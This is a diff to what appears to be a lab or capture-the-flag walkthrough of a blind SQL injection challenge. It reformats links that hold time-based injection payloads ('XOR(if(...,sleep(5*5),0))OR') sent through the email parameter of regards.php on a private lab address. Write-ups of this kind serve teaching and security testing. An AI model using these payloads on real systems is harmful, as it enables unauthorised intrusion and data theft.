@@ -26,11 +26,11 @@ description: "SQL Injection Blind - A walkthrough of the challenge with enumerat
 
 **'XOR(if(now()=sysdate(),sleep(5\*5),0))OR'**
 
-<http://10.102.173.241/regards.php?email=stefan@immersivenews.co.uk%27XOR(if(now()=sysdate(),sleep(5*5),0))OR%27>
+`http:// 10.102.173.241/regards.php?email=stefan@immersivenews.co.uk%27XOR(if(now()=sysdate(),sleep(5*5),0))OR%27`
 
 **'XOR(if(1=1,sleep(5\*5),0))OR'**
 
-<http://10.102.173.241/regards.php?email=stefan@immersivenews.co.uk%20%27XOR(if(1=1,sleep(5*5),0))OR%27>
+`http:// 10.102.173.241/regards.php?email=stefan@immersivenews.co.uk%20%27XOR(if(1=1,sleep(5*5),0))OR%27`
 
 **'XOR(if(2=1,sleep(5\*5),0))OR'** \<--- This shouldn't work because the statement is false (2=1)
 
